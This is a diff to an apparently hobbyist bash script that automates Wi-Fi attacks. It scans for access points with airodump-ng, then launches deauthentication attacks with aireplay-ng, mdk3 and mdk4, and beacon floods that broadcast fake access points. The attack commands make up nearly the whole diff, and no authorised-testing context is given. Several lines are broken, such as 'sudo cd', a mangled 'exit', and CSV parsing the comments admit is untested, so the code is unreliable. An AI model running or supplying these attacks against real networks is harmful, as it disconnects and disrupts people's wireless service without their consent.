@@ -75,6 +75,7 @@ if [ $aircrackCheck == "false" ]; then
 else
     echo "aircrack-ng is installed"
 fi
+sudo cd ~/Desktop
 #user input for a AP's name
 read -p "Enter the AP's name: " AP
 sleep 1
@@ -97,35 +98,31 @@ else
 fi
 sudo ifconfig wlan0 up
 
-#asking the user which attack they want to use
-read -p "which attack do you want to use? mdk3(1), mdk4(2), aireplay-ng(3)?: " "attack"
-if [ $attack == "1" ]; then
-    echo "starting mdk3 attack"
-    sudo mdk3 wlan0 d -w $AP
-elif [ $attack == "2" ]; then
-    echo "starting mdk4 attack"
-    sudo mdk4 wlan0 d -w $AP
-elif [ $attack == "3" ]; then
+For_aireplay () {
     echo "setting up aireplay-ng deauth attack"
-#deletes the files if they exist so no duplicates
-#also recommend to use the desktop directory for this
+    #deletes the files if they exist so no duplicates
+    #also recommend to use the desktop directory for this
     if [ -e "wlan0-01.csv" ]; then
         rm wlan0-01.csv
+        echo "removed wlan0-01.csv"
     else
         echo "no more wlan0-01.csv"
     fi
     if [ -e "bssid.csv" ]; then
         rm bssid.csv
+        echo "removed bssid.csv"
     else
         echo "no more bssid.csv"
     fi
     if [ -e "bssid1.csv" ]; then
         rm bssid1.csv
+        echo "removed bssid1.csv"
     else
         echo "no more bssid1.csv"
     fi
     if [ -e "bssid2.csv" ]; then
         rm bssid2.csv
+        echo "removed bssid2.csv"
     else
         echo "no  more bssid2.csv"
     fi
@@ -137,7 +134,7 @@ elif [ $attack == "3" ]; then
     cat wlan0-01.csv | grep $AP > bssid.csv
     cat bssid.csv | sed 's/,//g' > bssid1.csv
     checknumberofbssids=$(cat bssid1.csv | awk '{print $1}' | wc -l)
-    if [ $checknumberofbssids > 1 ]; then
+    if [ $checknumberofbssids \> 1 ]; then
         echo "multiple bssids found"
         cat bssid1.csv | awk '{print}'
         cat bssid1.csv | awk '{print $1}' 
@@ -170,7 +167,184 @@ elif [ $attack == "3" ]; then
     else
         echo "only one bssid found"
         thebssid=$(cat bssid1.csv | awk '{print $1}')
+        thechannel=$(cat bssid1.csv | awk '{print $6}')
+        echo "changing channel to $thechannel"
+        sleep 1
+        sudo iwconfig wlan0 channel $thechannel
+        read -p "how long do you want to run the attack for? (in seconds): " time2
+        if [ $time2 == "0" ]; then
+            echo "running attack until you stop it"
+            sudo aireplay-ng -0 0 -a $thebssid wlan0
+        elif [[ -n ${time2//[0-9]/} ]]; then
+            echo "invalid input"
+            sleep 1 
+            echo "running attack until you stop it (ctrl c)"
+            sudo aireplay-ng -0 0 -a $thebssid wlan0
+        else
+            echo "running attack for $time2 seconds"
+            sudo aireplay-ng -0 $time2 -a $thebssid wlan0
+            echo "attack finished"
+            sleep 1
+        fi
     fi
-else
-fi
-exit 1 
+}
+
+
+For_mdk3 () {
+    echo "you chose mdk3"
+    read -p "which attack do you want to use? deuth(1) or channel becon flood(2): " attack
+    if [ $attack == 1 ]; then 
+        echo "you chose deauth attack"
+        echo "removing existing csv files"
+        if [ -e "wlan0-01.csv" ]; then
+            rm wlan0-01.csv
+            echo "removed wlan0-01.csv"
+        else
+            echo "no more wlan0-01.csv"
+        fi
+        if [ -e "bssid.csv" ]; then
+            rm bssid.csv
+            echo "removed bssid.csv"
+        else
+            echo "no more bssid.csv"
+        fi
+        if [ -e "bssid1.csv" ]; then
+            rm bssid1.csv
+            echo "removed bssid1.csv"
+        else
+            echo "no more bssid1.csv"
+        fi
+        if [ -e "bssid2.csv" ]; then
+            rm bssid2.csv
+            echo "removed bssid2.csv"
+        else
+            echo "no  more bssid2.csv"
+        fi
+        echo "all files deleted or non existent"
+        echo "starting airodump-ng to find APs, this will take 30 seconds"
+        sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
+        sleep 32
+        # this clears the "," from the csv file
+        cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
+        #this should be the bssid/mac address v
+        cat bssid1.csv | awk '{print $1}' > bssid.csv
+        #this should be the channel v
+        cat bssid1.csv | awk '{print $6}' > bssid.csv
+        #this should be the SSID v
+        #need to test to actually know what column it's in curretly don't know
+        cat bssid1.csv | awk '{print $10}' > bssid.csv
+        cat bssid.csv | awk '{print}'
+        read -p "which AP?: " AP
+        echo "you chose $AP"
+        cat bssid.csv | grep $AP > bssid2.csv
+        cat bssid2.csv | awk '{print $1}' > Black-List.txt
+        channelused=$(cat bssid2.csv | awk '{print $2}')
+        echo "starting mdk3 deauth attack"
+        echo "cancel the attack with ctrl c"
+        sudo mdk3 wlan0 d -c $channelused -b Black-List.txt
+
+    elif [ $attack == 2 ]; then
+        echo "you chose channel becon flood"
+        read -p "which channel do you want to flood?: " channel
+        if [[ -n ${channel//[0-9]/} ]]; then
+            echo "invalid input"
+            exit 1
+        fi
+        echo "you chose channel $channel"
+        echo "starting mdk3 channel becon flood"
+        echo "cancel the attack with ctrl c"
+        sudo mdk3 wlan0 b -c $channel
+    else
+        echo "invalid input"
+        exit 1
+    fi
+}
+
+
+
+For_mdk4 () {
+    echo "you chose mdk4"
+    read -p "which attack do you want to use? deauth(1) or channel becon flood(2): " attack
+    if [ $attack = 1 ];then
+        echo "you chose deauth attack"
+        echo "removing existing csv files"
+        if [ -e "wlan0-01.csv" ]; then
+        rm wlan0-01.csv
+        echo "removed wlan0-01.csv"
+        else
+            echo "no more wlan0-01.csv"
+        fi
+        if [ -e "bssid.csv" ]; then
+            rm bssid.csv
+            echo "removed bssid.csv"
+        else
+            echo "no more bssid.csv"
+        fi
+        if [ -e "bssid1.csv" ]; then
+            rm bssid1.csv
+            echo "removed bssid1.csv"
+        else
+            echo "no more bssid1.csv"
+        fi
+        if [ -e "bssid2.csv" ]; then
+            rm bssid2.csv
+            echo "removed bssid2.csv"
+        else
+            echo "no  more bssid2.csv"
+        fi
+        echo "all files deleted or non existent"
+        echo "starting airodump-ng to find APs, this will take 30 seconds"
+        sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
+        sleep 32
+        # this clears the "," from the csv file
+        cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
+        #this should be the bssid/mac address v
+        cat bssid1.csv | awk '{print $1}' > bssid.csv
+        #this should be the SSID v
+        #need to test to actually know what column it's in curretly don't know
+        cat bssid1.csv | awk '{print $10}' > bssid.csv
+        cat bssid.csv | awk '{print}'
+        read -p "which AP?: " AP
+        echo "you chose $AP"
+        cat bssid.csv | grep $AP > bssid2.csv
+        #this should be the bssid/mac address v
+        usedbssid=$(cat bssid2.csv | awk '{print $1}')
+        echo "starting mdk4 deauth attack"
+        echo "cancel the attack with ctrl c"
+        sudo mdk4 wlan0 d -b $usedbssid
+    elif [ $attack = 2 ]; then
+        echo "you chose channel becon flood"
+        read -p "which channel do you want to flood?: " channel
+        if [[ -n ${channel//[0-9]/} ]]; then
+            echo "invalid input"
+        e   xit 1
+        else
+            echo "you chose channel $channel"
+        fi
+        read -p "you can make a name for the fake APs, do you want to? (y/n): " name
+        if [ $name == "y" ]; then
+            read -p "what name do you want to use?: " name
+            echo "you chose $name"
+            echo "starting mdk4 channel becon flood"
+            echo "cancel the attack with ctrl c"
+            sudo mdk4 wlan0 b -n $name -c $channel
+        elif [ $name == "n" ]; then
+            echo "no name chosen, just use mdk3 bruh"
+            echo "exiting"
+            exit 1
+        else
+            echo "invalid input"
+            exit 1
+        fi
+    else
+        echo "invalid input"
+        exit 1
+    fi
+}
+
+
+
+
+
+
+#asking the user which attack they want to use
